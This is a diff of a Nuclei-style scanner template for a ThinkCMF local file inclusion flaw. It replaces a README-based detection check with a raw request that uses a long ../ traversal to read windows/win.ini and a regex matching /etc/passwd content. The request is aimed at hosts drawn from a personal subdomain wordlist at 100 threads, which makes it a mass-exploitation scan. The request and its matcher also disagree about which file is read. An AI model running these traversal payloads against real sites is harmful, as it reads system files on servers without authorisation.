@@ -1,38 +1,34 @@
-id: thinkcmf-lfi
-
+id: thinkcmf-lfi 2
 info:
-  name: ThinkCMF - Local File Inclusion
   author: pikpikcu
+  name: ThinkCMF LFI
+  reference: https://www.freebuf.com/vuls/217586.html
   severity: high
-  description: ThinkCMF is vulnerable to local file inclusion.
-  reference:
-    - https://www.freebuf.com/vuls/217586.html
-  metadata:
-    win-payload: ../../../../../../../../../../../../../../../../windows/win.ini
-    unix-payload: ../../../../../../../../../../../../../../../../etc/passwd
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
-    cvss-score: 7.5
-    cwe-id: CWE-22
   tags: thinkcmf,lfi
-
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/?a=display&templateFile=README.md"
+- attack: sniper
+  matchers:
+  - regex:
+    - 'root:.*:0:0:'
+    - bit app support
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /?a=display&templateFile=../../../../../../../../../../../../../../../../windows/win.ini
+    HTTP/1.1
 
-    matchers-condition: and
-    matchers:
+    Host: {{Subdomains}}
 
-      - type: word
-        condition: and
-        words:
-          - "ThinkCMF"
-          - "## README"
-          - "## UPDATE"
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
-      - type: status
-        status:
-          - 200
+    Accept-Encoding: gzip, deflate
 
-# Enhanced by mp on 2022/08/05
+    Accept: */*
+
+    '
+  threads: 100
